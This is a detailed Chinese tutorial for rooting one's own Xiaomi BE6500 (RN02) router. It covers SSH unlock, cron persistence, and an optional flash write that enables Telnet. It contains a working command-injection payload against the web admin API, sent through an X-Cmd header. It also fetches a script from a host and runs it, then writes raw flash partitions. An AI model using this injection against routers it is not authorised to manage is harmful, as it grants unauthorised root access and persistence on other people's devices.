# 小米 BE6500（RN02）SSH 解锁与持久化教程

> 适用设备：小米路由器 BE6500 标准版（RN02）  
> 固件：MiWiFi 稳定版 1.0.64（2026-07 构建，GTAG 2cee470；U-Boot 1.0.2；Linux 5.4.213 / armv7l）  
> 整理日期：2026-11-19  
> 依据：2026-10-08 / 2026-10-09 的本地实机记录与验收结果

## 目录

1. [你将得到什么](#1-你将得到什么)
2. [适用范围与验证边界](#2-适用范围与验证边界)
3. [原理概览](#3-原理概览)
4. [准备工作](#4-准备工作)
5. [取得临时 root SSH](#5-取得临时-root-ssh)
6. [部署普通重启持久化](#6-部署普通重启持久化)
7. [可选：固化 Telnet 恢复入口](#7-可选固化-telnet-恢复入口)
8. [日常使用与排障](#8-日常使用与排障)
9. [回退与清理](#9-回退与清理)
10. [已验证结果与已知限制](#10-已验证结果与已知限制)
11. [常见问题](#11-常见问题)

---

## 1. 你将得到什么

本教程完成后，设备上会有两层入口：

| 层级 | 入口 | 认证方式 | 作用 |
| --- | --- | --- | --- |
| 日常入口 | `<ROUTER_IP>:2222` 的 root SSH | 仅公钥，Dropbear 以 `-s` 启动 | 日常管理、执行命令 |
| 恢复入口（可选） | `<ROUTER_IP>:23` 的原生 Telnet | 设备 root 口令 | 当 SSH 丢失时重建公钥 SSH |

同时部署：

- `/data/rn02ssh/` 保存公钥、主机密钥和 `ensure.sh`；
- `/etc/crontabs/root` 增加每分钟执行的 `ensure.sh`；
- 普通重启后 SSH 自动恢复；
- 可选的 bdata 固化只修改 `ssh_en`、`telnet_en` 两个服务开关。

需要说明的边界：

- 本教程覆盖的是 **LAN 内的 root SSH 管理入口**，不是官方固件的 SSH:22 服务；
- 本教程不包含私人密钥、`known_hosts` 内容、设备 SN、root 口令、代理订阅或设备备份；
- 本教程的实测范围是一台 RN02、固件 1.0.64。恢复出厂、官方固件升级和其他硬件型号没有实机验证结果。

## 2. 适用范围与验证边界

### 2.1 适用设备

| 项目 | 要求 |
| --- | --- |
| 型号 | 小米 BE6500 标准版（RN02） |
| 固件 | MiWiFi 稳定版 1.0.64 |
| Bootloader | U-Boot 1.0.2 |
| 内核 | Linux 5.4.213 / armv7l |
| 管理方式 | 有线 LAN，Web 后台可登录 |
| 维护条件 | 允许短时断网、后台排队和设备重启 |

其他型号、其他固件版本或其他分区布局，需要重新做静态核对与实机验证。写 flash 前必须按分区名称重新核对，不要照搬本文的 `mtd` 编号。

### 2.2 已验证与未验证

| 项目 | 状态 |
| --- | --- |
| 临时 root SSH | 已在实机验证 |
| 公钥登录、`uid=0` | 已在实机验证 |
| `/data/rn02ssh` + cron 持久化 | 已通过普通重启和冷启动验证 |
| bdata `ssh_en=1` / `telnet_en=1` | 已在实机验证，普通重启后保留 |
| 正常模式原生 Telnet:23 root 登录 | 已在实机验证 |
| 恢复出厂设置 | 未实测 |
| 官方固件升级 | 未实测 |
| 其他硬件型号 | 未实测 |

## 3. 原理概览

### 3.1 固件文件系统分层

| 位置 | 类型 | 重启后的行为 |
| --- | --- | --- |
| `/` | squashfs 只读 | 不变 |
| `/etc` | ramfs | 全部丢失，`authorized_keys`、host key 放在这里没有持久效果 |
| `/etc/config`、`/etc/crontabs` 等 | sec_cfg ext4 绑定挂载 | 持久 |
| `/data`（`/userdisk`，ubi1:cfg） | ubifs 可写 | 持久 |

因此，公钥和主机密钥的源文件要放在 `/data`，由 cron 在每次启动后复制回 `/etc/dropbear`。

### 3.2 官方 Dropbear 的启动门

官方 `/etc/init.d/dropbear` 的启动条件是：

- `nvram get ssh_en` 等于 `1`；
- 固件 CHANNEL 不等于 `release`。

稳定版固件的 CHANNEL 是 `release`，所以官方 init 路径不会启动 Dropbear。即使把 `ssh_en` 设为 1，仍需要手动启动 Dropbear，或通过持久化脚本在启动后拉起。

### 3.3 Web 管理接口的命令执行原语

本教程使用后台的 `set_global_enable` 接口作为临时命令执行入口：

- 请求路径：`/cgi-bin/luci/;stok=<STOK>/api/device_security/local_access/set_global_enable`
- 该方法会把 `mac` 参数整体转换为大写，因此 `mac` 中的常规小写命令会被破坏；
- nginx / fcgi-cgi 会把请求头 `X-Cmd` 变成环境变量 `HTTP_X_CMD`，子 shell 会继承这个变量；
- 把 `mac` 设为固定字符串 `'; $HTTP_X_CMD #`，命令放在 `X-Cmd` 请求头里，就能绕过大小写限制；
- `X-Cmd` 每次只能放一条简单命令。`&&`、`;`、`|`、`>>` 和引号经过变量展开后只是字面字符，不构成 shell 语法；复杂逻辑要先写进脚本，再用 `/bin/sh` 执行脚本。

请求体固定为：

```text
mac=%27%3B%20%24HTTP_X_CMD%20%23&enable=0
```

> 说明：`enable=0` 会走 `macfilter_wan_changed(mac, true)` 的 `none` 分支，不产生限速规则。该接口仍会触发 `parentalctl` 的 commit/apply，可能重建家长控制规则、更新 DNS 配置或重启 dnsmasq；后台请求也可能短时排队。执行前先在 Web 导出配置备份，并在维护窗口操作。

### 3.4 持久化结构

```text
/data/rn02ssh/
├── authorized_keys          # 登录公钥，与 PC 侧 <PRIVATE_KEY_PATH>.pub 一致
├── dropbear_rsa_host_key    # 主机密钥，保持指纹稳定
└── ensure.sh                # 700，root
```

`/etc/crontabs/root` 末行：

```text
* * * * * /bin/sh /data/rn02ssh/ensure.sh
```

`ensure.sh` 每分钟做两件事：

1. 把 `/data/rn02ssh/authorized_keys` 复制回 `/etc/dropbear/authorized_keys`；
2. 如果 `pidof dropbear` 为空，就用 `/data/rn02ssh/dropbear_rsa_host_key` 启动 Dropbear，绑定 LAN IP 的 2222 端口并加 `-s` 禁用密码登录。

### 3.5 bdata 固化原理（可选）

RN02 的 bootloader 会读取 crash 分区的前四个字节：

- 写入 `A5 5A 00 00` 后重启，设备进入工厂模式；
- 工厂模式下 bdata 分区的写保护标志从 `0x0` 变为 `0x400`，可以写入；
- 只写入 `ssh_en=1` 和 `telnet_en=1`；
- 清除 crash 标记并重启，回到正常模式；
- 正常模式下原生 Telnet:23 使用 root 口令认证，可用于重建公钥 SSH。

这条路线会写 flash，必须先完成完整备份、分区核对和退出工厂模式的恢复方案。

## 4. 准备工作

### 4.1 硬件与网络

1. 用网线连接路由器 LAN 口，管理电脑使用固定 IPv4，例如 `<PC_IP>/24`；不要占用网内已有设备地址。
2. 确认路由器 LAN 地址为 `<ROUTER_IP>`。默认是 `192.168.31.1`，如果改过地址，后续命令统一替换。
3. 浏览器打开 `http://<ROUTER_IP>`，确认型号为 RN02、固件为 1.0.64，并关闭自动升级。
4. 选择允许短时断网、后台重启的维护时段。Web 注入会触发 `parentalctl` 的 commit/apply，后台可能短时排队。

### 4.2 工具检查

在 Windows PowerShell 中执行：

```powershell
Set-Location '<WORKDIR>'
ssh -V
python --version
Test-NetConnection <ROUTER_IP> -Port 80
```

预期：OpenSSH 客户端和 Python 3 可以启动，80 端口连接成功。端口超时只说明当前不可达，不要把它当作“没有服务监听”的证据。

### 4.3 导出 Web 配置备份

在路由器 Web 后台的“系统设置 / 备份”中导出配置。这个备份不是取得 SSH 后的完整分区备份，但它可以在 Web 配置被误改时提供第一层恢复材料。

### 4.4 生成 RSA 密钥对

Dropbear 2017.75 只支持 `ssh-rsa`，不支持 ed25519 或 ecdsa。生成 3072 位 RSA 密钥：

```powershell
ssh-keygen -t rsa -b 3072 -f '<PRIVATE_KEY_PATH>'
```

要点：

- 私钥 `<PRIVATE_KEY_PATH>` 只留在本机，权限限制为当前账户可读；
- 如果设置了口令，后续自动化检查需要使用 ssh-agent 加载密钥；
- 只把 `<PRIVATE_KEY_PATH>.pub` 复制到公开目录；
- 私钥、`known_hosts`、备份和日志都不要放进公开仓库或公共网盘。

### 4.5 准备只含公开材料的下载目录

```powershell
New-Item -ItemType Directory -Path '<WORKDIR>\rn02-ssh-public' -Force | Out-Null
Copy-Item -LiteralPath '<PRIVATE_KEY_PATH>.pub' -Destination '<WORKDIR>\rn02-ssh-public\k.pub'
```

目录中只应出现：

```text
rn02-ssh-public/
├── k.pub
└── bootstrap.sh
```

### 4.6 创建 bootstrap.sh

在 `<WORKDIR>\rn02-ssh-public\bootstrap.sh` 写入以下内容，并把 `<PC_IP>`、`<ROUTER_IP>` 替换为实际地址：

```sh
#!/bin/sh
set -eu

if pidof dropbear >/dev/null 2>&1; then
    echo 'STOP: dropbear already running; inspect existing service first.'
    exit 1
fi

mkdir -p /etc/dropbear
chmod 700 /etc/dropbear

/bin/uclient-fetch http://<PC_IP>:8000/k.pub -O /tmp/rn02-k.pub
test -s /tmp/rn02-k.pub
grep -q '^ssh-rsa ' /tmp/rn02-k.pub

if [ -s /etc/dropbear/authorized_keys ]; then
    echo 'STOP: existing authorized_keys; preserve and inspect first.'
    exit 1
fi

cp /tmp/rn02-k.pub /etc/dropbear/authorized_keys
chmod 600 /etc/dropbear/authorized_keys

if [ -e /etc/dropbear/dropbear_rsa_host_key ] && [ ! -s /etc/dropbear/dropbear_rsa_host_key ]; then
    rm /etc/dropbear/dropbear_rsa_host_key
fi

/usr/sbin/dropbear -R -p <ROUTER_IP>:2222 -s
```

这个脚本做了四件事：

1. 检查是否已有 Dropbear 在运行；
2. 从 PC 的 HTTP 服务下载公钥；
3. 处理出厂时常见的 0 字节 host key 占位文件；
4. 在 LAN 地址的 2222 端口启动仅公钥认证的 Dropbear。

### 4.7 启动临时 HTTP 服务

另开一个 PowerShell 窗口，保持运行：

```powershell
python -m http.server 8000 --bind <PC_IP> --directory '<WORKDIR>\rn02-ssh-public'
```

在 PC 上先验证：

```powershell
Invoke-WebRequest -UseBasicParsing 'http://<PC_IP>:8000/k.pub'
```

如果 Windows 防火墙询问，只允许可信的当前本地网络。确认共享目录中只有 `k.pub` 和 `bootstrap.sh`。

## 5. 取得临时 root SSH

### 5.1 取得后台 stok

1. 浏览器正常登录路由器后台；
2. 看地址栏，找到 `;stok=` 后面的字符串；
3. 只在 PowerShell 交互提示中输入，不保存到文件、不截图、不进入命令历史。

### 5.2 定义发送函数

在另一个 PowerShell 窗口执行：

```powershell
$stok = Read-Host '输入本次后台 stok（不保存到文件）'
$unlockUri = "http://<ROUTER_IP>/cgi-bin/luci/;stok=$stok/api/device_security/local_access/set_global_enable"

function Send-RN02Command([string]$Command) {
    $timer = [Diagnostics.Stopwatch]::StartNew()
    try {
        $reply = Invoke-WebRequest -UseBasicParsing -Method Post -Uri $unlockUri `
            -ContentType 'application/x-www-form-urlencoded' `
            -Headers @{ 'X-Cmd' = $Command } `
            -Body 'mac=%27%3B%20%24HTTP_X_CMD%20%23&enable=0' -TimeoutSec 40
        $timer.Stop()
        Write-Host ('HTTP={0}, 耗时={1:N2}s' -f $reply.StatusCode, $timer.Elapsed.TotalSeconds)
    } catch {
        throw '请求失败或超时。停止，不重发；先检查后台与网络。'
    }
}
```

### 5.3 先做延时验证

```powershell
Send-RN02Command 'sleep 20'
```

预期响应耗时约 20 秒。响应体里的 `code=0`、HTTP 200 或单次延时都不独立证明命令执行成功，最终要用第 5.7 步的 root SSH 登录证明。

如果耗时明显不符、认证失效或后台异常，停止并查明原因，不要连续重发。

### 5.4 下载 bootstrap.sh

```powershell
Send-RN02Command '/bin/uclient-fetch http://<PC_IP>:8000/bootstrap.sh -O /tmp/rn02-bootstrap.sh'
```

检查 HTTP 服务窗口：应出现来自路由器 IP 的 `GET /bootstrap.sh`，状态码 200。

### 5.5 执行 bootstrap.sh

```powershell
Send-RN02Command '/bin/sh /tmp/rn02-bootstrap.sh'
```

检查 HTTP 服务窗口：应出现来自路由器 IP 的 `GET /k.pub`，状态码 200。

### 5.6 检查 2222 端口

```powershell
Test-NetConnection <ROUTER_IP> -Port 2222
```

预期 `TcpTestSucceeded : True`。如果仍然关闭，不要反复重发引导脚本；先核对 HTTP 日志、stok、网络和脚本执行条件。

### 5.7 登录并确认 root 身份

```powershell
ssh -i '<PRIVATE_KEY_PATH>' -p 2222 `
  -o UserKnownHostsFile='<KNOWN_HOSTS_PATH>' `
  -o PubkeyAcceptedAlgorithms=+ssh-rsa -o HostkeyAlgorithms=+ssh-rsa `
  root@<ROUTER_IP>
```

第一次连接会提示确认主机指纹。在可信直连网络中确认这是目标设备的指纹并保存。以后指纹变化时先排查，不要盲目删除 `known_hosts`。

登录后执行：

```sh
id
netstat -lnt | grep ':2222 '
ps | grep '[d]ropbear'
ls -l /etc/dropbear/authorized_keys /etc/dropbear/dropbear_rsa_host_key
```

必须同时满足：

- `id` 输出 `uid=0(root)`；
- 监听地址是 `<ROUTER_IP>:2222`，不是 `0.0.0.0:2222`；
- Dropbear 启动参数包含 `-s`；
- `authorized_keys` 和 `dropbear_rsa_host_key` 两个文件都非空。

四项都满足后才能进入持久化部署。

## 6. 部署普通重启持久化

### 6.1 安装 /data/rn02ssh

如果 `/data/rn02ssh` 已经存在，先检查现有脚本、公钥和主机密钥，不要覆盖。下面适用于首次安装：

```sh
set -eu
test ! -e /data/rn02ssh
mkdir -p /data/rn02ssh
chmod 700 /data/rn02ssh
cp /etc/dropbear/authorized_keys /data/rn02ssh/authorized_keys
cp /etc/dropbear/dropbear_rsa_host_key /data/rn02ssh/dropbear_rsa_host_key
chmod 600 /data/rn02ssh/authorized_keys /data/rn02ssh/dropbear_rsa_host_key

cat > /data/rn02ssh/ensure.sh <<'EOF'
#!/bin/sh
set -eu
D=/data/rn02ssh
test -s "$D/authorized_keys"
test -s "$D/dropbear_rsa_host_key"
mkdir -p /etc/dropbear
chmod 700 /etc/dropbear
cp "$D/authorized_keys" /etc/dropbear/authorized_keys
chmod 600 /etc/dropbear/authorized_keys
if ! pidof dropbear >/dev/null 2>&1; then
    IP=$(uci -q get network.lan.ipaddr 2>/dev/null || true)
    [ -n "$IP" ] || IP=192.168.31.1
    /usr/sbin/dropbear -r "$D/dropbear_rsa_host_key" -p "$IP:2222" -s
fi
EOF

chmod 700 /data/rn02ssh/ensure.sh
touch /etc/crontabs/root
chmod 600 /etc/crontabs/root
if ! grep -qF '/data/rn02ssh/ensure.sh' /etc/crontabs/root; then
    printf '\n* * * * * /bin/sh /data/rn02ssh/ensure.sh\n' >> /etc/crontabs/root
fi
/bin/sh /data/rn02ssh/ensure.sh
/etc/init.d/cron restart
sync
```

说明：

- `/etc` 会随重启清空，所以公钥源文件与主机密钥放在 `/data`；
- cron 在下一分钟恢复 SSH；
- 脚本不会替换其他已经运行的 Dropbear；独立维护时应核查现有进程参数；
- 如果路由器 LAN 地址不是 `192.168.31.1`，把 `ensure.sh` 中的回落地址改成你的 `<ROUTER_IP>`。

### 6.2 第一次重启验证

在路由器 shell 记录当前 boot_id：

```sh
cat /proc/sys/kernel/random/boot_id
reboot
```

等待路由器启动，再额外等至多一个 cron 周期，按第 5.7 步重新登录，确认：

```sh
id
cat /proc/sys/kernel/random/boot_id
netstat -lnt | grep ':2222 '
ps | grep '[d]ropbear'
grep -F '/data/rn02ssh/ensure.sh' /etc/crontabs/root
```

预期：

- `boot_id` 发生变化；
- 主机指纹不变；
- `uid=0`；
- 仍绑定 `<ROUTER_IP>:2222` 且带 `-s`；
- cron 行存在；
- Web 后台和原有联网正常。

到这里，SSH 解锁与普通重启持久化完成。

### 6.3 清理临时材料

在 PC 的 HTTP 服务窗口按 `Ctrl+C` 停止服务，并清理 PowerShell 会话变量：

```powershell
Remove-Variable stok,unlockUri -ErrorAction SilentlyContinue
```

确认 `rn02-ssh-public` 目录中没有私钥或备份，只保留 `k.pub` 和 `bootstrap.sh`。

## 7. 可选：固化 Telnet 恢复入口

> 本节会写 flash，只适用于已经完成第 5、6 节、并且有完整备份与恢复方案的设备。如果只需要普通重启后的 SSH，可以跳过本节。

### 7.1 先核对设备状态

在 SSH 中执行：

```sh
cat /proc/xiaoqiang/ft_mode
cat /sys/class/mtd/mtd21/name
cat /sys/class/mtd/mtd22/name
cat /sys/class/mtd/mtd21/flags
cat /sys/class/mtd/mtd22/offset
```

本机型实测参考值：

| 项目 | 值 |
| --- | --- |
| `ft_mode` | `0` |
| `mtd21` 名称 | `bdata` |
| `mtd22` 名称 | `crash` |
| `mtd21` flags | `0x0` |
| `mtd22` offset | `105644032` |

分区编号只适用于本文对应机型。其他设备要按名称重新核对，不要照搬。

### 7.2 完整备份

至少备份以下内容，并保存在本机受限目录：

- `mtd13`（引导环境）、`mtd21`（bdata）、`mtd22`（crash）的镜像；
- `nvram` / `bdata` 原始字段快照；
- `/etc/shadow` 的 root 行（仅本地保存）；
- `/etc/config`、`/etc/crontabs/root`、`/data/rn02ssh` 和现有 SSH 材料；
- 分区表、挂载信息、启动日志。

备份要求：

- 原始带 OOB 的镜像不要直接用于 `mtd write`；
- 备份中包含设备标识、密钥和口令材料，只留本机；
- 写入前确认 crash 分区原始内容全为 `0xFF`；
- 备份不完整、分区布局不符或 bootloader 哈希不符时，停止在备份阶段。

### 7.3 写 flash 前验证 Telnet 口令

本步骤不修改 nvram 或 bdata，只在内存中临时启动一个 LAN:2323 的 Telnet 监听，用现有 root 口令登录验证。以下命令在 SSH 中执行：

```sh
set -eu
test ! -e /tmp/rn02-telnet-check
mkdir -m 700 /tmp/rn02-telnet-check

cat > /tmp/rn02-telnet-check/bdata <<'EOF'
#!/bin/sh
if [ "$#" = 2 ] && [ "$1" = get ] && [ "$2" = telnet_en ]; then
    echo 1
else
    exec /usr/sbin/bdata "$@"
fi
EOF

chmod 700 /tmp/rn02-telnet-check/bdata
PATH=/tmp/rn02-telnet-check:$PATH /usr/sbin/telnetd -F -l /bin/login.sh -b <ROUTER_IP>:2323 >/tmp/rn02-telnet-check/log 2>&1 </dev/null &
echo $! > /tmp/rn02-telnet-check/pid
netstat -lnt | grep ':2323 '
```

在 PC 上用 PuTTY 的 Telnet 模式连接 `<ROUTER_IP>:2323`，输入 `root` 和设备 root 口令，再执行 `id`。必须得到 `uid=0`。Telnet 口令和会话不加密，仅在可信 LAN 做此检查。

退出测试会话后，在原 SSH 中只关闭刚启动的 PID：

```sh
p=$(cat /tmp/rn02-telnet-check/pid)
if [ -r /proc/$p/cmdline ] && tr '\000' ' ' </proc/$p/cmdline | grep -q 'telnetd -F -l /bin/login.sh -b <ROUTER_IP>:2323'; then
    kill "$p"
fi
netstat -lnt | grep ':2323 ' || true
```

预期最后没有 2323 监听。认证失败、监听地址不符或清理失败时，停止在固化之前。

### 7.4 写入 crash 标记并进入工厂模式

再次确认 bdata 和 crash 的当前哈希与备份一致，然后执行：

```sh
set -eu
test "$(cat /proc/xiaoqiang/ft_mode)" = 0
test "$(cat /sys/class/mtd/mtd21/name)" = bdata
test "$(cat /sys/class/mtd/mtd22/name)" = crash
test "$(cat /sys/class/mtd/mtd22/offset)" = 105644032
test ! -e /tmp/rn02-crash-marker.bin

printf '\245\132\000\000' > /tmp/rn02-crash-marker.bin
test "$(wc -c </tmp/rn02-crash-marker.bin)" = 4
mtd write /tmp/rn02-crash-marker.bin crash
sync
dd if=/dev/mtd22 bs=4 count=1 2>/dev/null | hexdump -v -e '4/1 "%02x"'
printf '\n'
```

预期最后读回恰为：

```text
a55a0000
```

读回不一致或写入报错时，不重启、不重写，保留当前可用 SSH 并检查。

读回确认后才执行：

```sh
reboot
```

启动后用原密钥重新 SSH 登录，确认：

```sh
cat /proc/xiaoqiang/ft_mode
cat /sys/class/mtd/mtd21/flags
```

预期 `ft_mode` 为 `1`，bdata flags 为 `0x400`。

### 7.5 只提交两个 bdata 开关

```sh
set -eu
test "$(cat /proc/xiaoqiang/ft_mode)" = 1
test "$(cat /sys/class/mtd/mtd21/name)" = bdata
test "$(cat /sys/class/mtd/mtd21/flags)" = 0x400

bdata set ssh_en=1
bdata set telnet_en=1
bdata commit
sync
bdata get ssh_en
bdata get telnet_en
```

预期分别输出 `1` 和 `1`。随后把 bdata 全字段与备份逐项比较：只允许 `ssh_en`、`telnet_en` 为 `1`，其他字段必须与备份一致。

不要设置 `uart_en` 或 `boot_wait`，不要加载内核模块，不要修改 rootfs 或 bootloader。

### 7.6 清除 crash 并退出工厂模式

```sh
set -eu
test "$(cat /proc/xiaoqiang/ft_mode)" = 1
test "$(cat /sys/class/mtd/mtd22/name)" = crash
mtd erase crash
sync
sha256sum /dev/mtd22
```

把读出的 SHA-256 与备份中的原始 `mtd22` 镜像比较，必须完全一致，才能执行：

```sh
reboot
```

### 7.7 恢复工厂模式的附带变化

工厂模式会使 nvram 的以下字段发生变化：

- `uart_en`
- `boot_wait`
- `wl2_radio`
- `wl2_ssid`

按备份中的原值逐项恢复，不要用固定值覆盖。恢复后再检查 `/etc/crontabs/root` 是否缺少原有任务；如果缺少，按备份补回，但不要覆盖其他新增任务。

### 7.8 最终验收

在 SSH 中执行：

```sh
id
cat /proc/xiaoqiang/ft_mode
cat /sys/class/mtd/mtd21/flags
bdata get ssh_en
bdata get telnet_en
netstat -lnt | grep -E ':(23|2222) '
ps | grep '[d]ropbear'
iptables -S input_wan_rule
ip6tables -S input_wan_rule
```

要求：

- `uid=0`；
- 工厂模式为 `0`；
- bdata flags 为 `0x0`；
- `ssh_en` 和 `telnet_en` 均为 `1`；
- SSH 绑定 `<ROUTER_IP>:2222` 且带 `-s`；
- 原生 Telnet 可能监听 `:::23`，这是正常现象；
- 没有新增 WAN 23/2222 放行规则。

再用 PuTTY Telnet 连接 `<ROUTER_IP>:23`，使用 root 口令登录并执行 `id`，必须得到 `uid=0`。这次要使用原生服务，不要依赖第 7.3 节的临时监听。

最后做一次普通重启，重新验证 SSH 和 Telnet:23 都正常。

## 8. 日常使用与排障

### 8.1 SSH 登录命令

```powershell
ssh -i '<PRIVATE_KEY_PATH>' -p 2222 `
  -o UserKnownHostsFile='<KNOWN_HOSTS_PATH>' `
  -o PubkeyAcceptedAlgorithms=+ssh-rsa -o HostkeyAlgorithms=+ssh-rsa `
  root@<ROUTER_IP>
```

可保存为 `rn02_ssh.cmd`，把路径换成自己的实际路径。

### 8.2 登录后 10 秒体检

```sh
id
netstat -lnt | grep ':2222 '
ps | grep '[d]ropbear' | grep -v grep
tail -1 /etc/crontabs/root
ls -l /data/rn02ssh/
```

预期：`uid=0`、仅监听 `<ROUTER_IP>:2222`、Dropbear 带 `-s`、cron 行存在、`/data/rn02ssh` 三个文件齐全。

### 8.3 常见症状

| 症状 | 可能原因 | 处理 |
| --- | --- | --- |
| SSH 连不上，Web 正常 | Dropbear 没有启动，或 cron 行被清 | 重新执行第 5 节，或经 Telnet 执行 `/bin/sh /data/rn02ssh/ensure.sh` |
| 提示主机指纹变化 | 设备重置或 host key 被删 | 先核对设备，再重建 `known_hosts`；如果 `/data/rn02ssh` 丢失，执行完整重部署 |
| 提示公钥被拒 | `/etc/dropbear/authorized_keys` 丢失，cron 尚未补齐 | 等下一分钟；仍不行则重新执行第 5 节 |
| LAN 网段改变 | `ensure.sh` 会自动读取新的 LAN IP | 直接连接新地址，无需改脚本 |
| 官方固件升级后 SSH 丢失 | 目标固件可能清理持久层或改变启动逻辑 | 先检查 Telnet 恢复入口；重新注入前核对固件版本和接口是否仍存在 |

### 8.4 如果 SSH 丢失但 Telnet:23 仍可登录

1. 用 Telnet 登录 root，执行 `id` 确认 `uid=0`；
2. 检查 `/data/rn02ssh` 是否仍包含有效公钥、主机密钥和 `ensure.sh`；
3. 材料完整时执行 `/bin/sh /data/rn02ssh/ensure.sh`；
4. 再按第 5.7 步验证 SSH；
5. 材料丢失时，按第 5 节的 bootstrap 逻辑重新下载公钥并启动 Dropbear；
6. 如果 host key 已重新生成，指纹会变化；在 Telnet 会话核对新指纹后，只删除 `known_hosts` 中对应 `[<ROUTER_IP>]:2222` 的旧条目。

## 9. 回退与清理

### 9.1 撤销公钥 SSH 持久化

在路由器上执行：

```sh
sed -i '/rn02ssh/d' /etc/crontabs/root
rm -rf /data/rn02ssh
killall dropbear
```

在 PC 上删除 `<PRIVATE_KEY_PATH>`、`<PRIVATE_KEY_PATH>.pub` 和 `<KNOWN_HOSTS_PATH>`。

以上只撤销公钥 SSH 方案，不撤销 bdata 固化，也不关闭原生 Telnet。

### 9.2 bdata 固化的回退

bdata 固化过的设备需要单独制定回退方案。不要直接把旧备份 `mtd write` 回分区：

- 先确认当前 bdata 和 crash 的哈希、分区名称和写保护状态；
- 在工厂模式下才能写 bdata；
- 只修改需要撤销的开关，并逐字段比较；
- 清除 crash 后核对哈希与原始镜像一致，再重启；
- 恢复工厂模式带来的 nvram 附带变化。

如果没有完整的备份和恢复方案，保持现有可用 SSH 入口，不要反复进出工厂模式。

## 10. 已验证结果与已知限制

2026-10-08 的最终验收记录：

| 验收项 | 结果 |
| --- | --- |
| 正常模式 | 是 |
| bdata 只读 | 是 |
| bdata 仅变化的字段 | `ssh_en`、`telnet_en` |
| crash 与原始镜像一致 | 是 |
| 原有 SSH 与网络配置未改变 | 是 |
| 原生 Telnet root 登录 | 是 |
| nvram 变化字段 | 无 |
| nvram 中的 `ssh_en` / `telnet_en` / `uart_en` / `boot_wait` | `0` / `0` / `0` / `off` |

设备状态摘要：

- SSH 监听 `<ROUTER_IP>:2222`；
- 原生 Telnet 监听 `:::23`；
- bdata 的 `ssh_en` 和 `telnet_en` 均为 `1`；
- 普通重启后 SSH 恢复入口仍可用；
- 原有 SSH 和网络配置保持原状。

未覆盖：

- 恢复出厂设置；
- 官方固件升级；
- 其他硬件型号；
- WAN 外部对 23/2222 的可达性实测。

## 11. 常见问题

### Q1：为什么 SSH 是 2222 端口，而不是 22？

官方 Dropbear init 脚本要求 `nvram ssh_en=1` 且 CHANNEL 不等于 `release`。稳定版固件同时满足这两个条件的路径不会启动官方 SSH:22。本教程使用手动 Dropbear，监听 LAN 的 2222 端口，避免和官方服务及防火墙策略混在一起。

### Q2：为什么每次重启后 `/etc/dropbear` 里的文件会消失？

`/etc` 是 ramfs，重启后清空。公钥、主机密钥和 `ensure.sh` 必须放在 `/data`，由 cron 在启动后复制回 `/etc/dropbear`。

### Q3：为什么客户端要加 `PubkeyAcceptedAlgorithms=+ssh-rsa` 和 `HostkeyAlgorithms=+ssh-rsa`？

Dropbear 2017.75 只支持 `ssh-rsa`。OpenSSH 8.8 及以上默认禁用这个算法，需要在客户端显式加回。

### Q4：为什么 `mac` 参数被大写，命令还能执行？

`mac` 参数会被整体转换为大写，所以载荷本身只使用大写字符和符号：`'; $HTTP_X_CMD #`。真正的命令放在 `X-Cmd` 请求头里，由 nginx 转成环境变量 `HTTP_X_CMD`，不受大写转换影响。

### Q5：为什么一个请求只能执行一条命令？

`X-Cmd` 的值经过变量展开时，`&&`、`;`、`|`、`>>` 和引号只是字面字符，不会重新参与 shell 语法解析。需要多条命令时，先把脚本下载到 `/tmp`，再用 `/bin/sh` 执行脚本。

### Q6：恢复出厂设置后还能直接登录吗？

恢复出厂可能清除 `/data/rn02ssh` 中的公钥、主机密钥和脚本，也可能重建配置卷。当前没有恢复出厂的实测结果。若 bdata 开关仍在，可尝试通过原生 Telnet:23 登录后重新部署公钥 SSH；该场景需要自行验证。

### Q7：官方固件升级会保留 SSH 吗？

取决于目标固件的升级、清理和启动逻辑。当前没有官方升级后的实测结果。升级前保留完整备份和 Telnet 恢复入口，升级后先检查 SSH，再决定是否重做。

### Q8：为什么教程里没有私人密钥、SN 或 root 口令？

这些属于设备凭据，只应保存在本机受限目录。仓库中的示例统一使用占位符，读者需要生成自己的密钥对，并使用自己设备的口令。

---

## 附：最小命令清单

```text
# PC -> 路由器 Web 注入
Send-RN02Command 'sleep 20'
Send-RN02Command '/bin/uclient-fetch http://<PC_IP>:8000/bootstrap.sh -O /tmp/rn02-bootstrap.sh'
Send-RN02Command '/bin/sh /tmp/rn02-bootstrap.sh'

# PC -> 路由器 SSH
ssh -i '<PRIVATE_KEY_PATH>' -p 2222 -o UserKnownHostsFile='<KNOWN_HOSTS_PATH>' \
  -o PubkeyAcceptedAlgorithms=+ssh-rsa -o HostkeyAlgorithms=+ssh-rsa root@<ROUTER_IP>

# 路由器 -> 持久化
/bin/sh /data/rn02ssh/ensure.sh
/etc/init.d/cron restart

# 路由器 -> 可选 bdata 固化
bdata set ssh_en=1
bdata set telnet_en=1
bdata commit
```

---

本文根据 2026-10-08 / 2026-10-09 的本地实机记录整理。原始归档、设备备份、私人密钥、`known_hosts`、SN、root 口令和代理配置均保留在本地，不随本仓库发布。
